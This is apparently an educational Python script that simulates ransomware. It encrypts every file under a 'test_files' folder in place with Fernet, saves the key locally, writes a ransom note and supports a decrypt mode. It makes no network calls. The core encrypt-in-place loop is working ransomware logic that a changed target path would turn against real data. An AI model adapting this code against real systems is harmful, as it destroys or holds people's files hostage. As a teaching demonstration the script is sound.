# malware-simulation/ransomware_sim.py
# Simulação educacional de ransomware - Leonardo Costa
# ⚠️ Uso apenas em ambiente controlado e com fins de aprendizado

import os
from cryptography.fernet import Fernet

TARGET_DIR = "test_files"  # Pasta com arquivos de teste
KEY_FILE = "ransom_key.key"
README_FILE = "README_DECRYPT.txt"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_files(key):
    fernet = Fernet(key)
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted)
            print(f"[+] Encrypted: {file_path}")

def decrypt_files(key):
    fernet = Fernet(key)
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            decrypted = fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(decrypted)
            print(f"[+] Decrypted: {file_path}")

def create_ransom_note():
    msg = """
Your files have been encrypted!  
This is a simulation for educational purposes only.  
To restore your files, run: python ransomware_sim.py --decrypt
"""
    with open(README_FILE, "w") as f:
        f.write(msg)
    print(f"[+] Ransom note created: {README_FILE}")

if __name__ == "__main__":
    import sys

    if "--decrypt" in sys.argv:
        key = load_key()
        decrypt_files(key)
    else:
        os.makedirs(TARGET_DIR, exist_ok=True)
        with open(os.path.join(TARGET_DIR, "test.txt"), "w") as f:
            f.write("This is a test file for ransomware simulation.")
        key = generate_key()
        encrypt_files(key)
        create_ransom_note()